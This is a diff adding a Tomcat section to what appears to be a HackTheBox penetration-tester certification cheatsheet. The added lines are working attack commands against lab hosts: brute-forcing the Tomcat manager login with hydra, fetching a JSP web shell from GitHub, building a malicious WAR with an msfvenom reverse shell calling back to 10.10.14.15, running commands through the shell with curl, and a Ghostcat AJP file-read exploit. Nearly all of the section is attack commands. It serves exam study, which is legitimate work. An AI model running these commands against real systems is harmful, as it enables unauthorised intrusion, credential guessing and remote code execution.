@@ -79,6 +79,7 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
   	- [WordPress](#WordPress)
   	- [Joomla](#joomla)
   	- [Drupal](#drupal)
+  	- [Tomcat](#tomcat)
   	- [Splunk](#splunk)
   	- [PRTG](#prtg)
   	- [GITLAB](#gitlab)
@@ -2040,6 +2041,23 @@ sqlmap -u "http://www.example.com/?id=1" --os-shell
 			- show options
 			- exploit
 			- meterpreter > getuid
+
+```
+### Tomcat
+```
+--> gobuster dir -u http://web01.inlanefreight.local:8180/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt
+-->  hydra -L /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -P /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt -s 8180 app-dev.inlanefreight.local http-get /manager/html
+--> msf6 auxiliary(scanner/http/tomcat_mgr_login)
+
+--> WEB SHELL IN TOMCAT
+	--> wget https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/jsp/cmd.jsp
+	--> zip -r backup.war cmd.jsp
+	OR --> msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war
+	--> curl http://web01.inlanefreight.local:8180/backup/cmd.jsp?cmd=id
+
+--> Ghostcat
+	--> https://web.archive.org/web/20260130182638/https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
+	--> python2.7 tomcat-ajp.lfi.py app-dev.inlanefreight.local -p 8009 -f WEB-INF/web.xml 
 
 ```
 ### Splunk
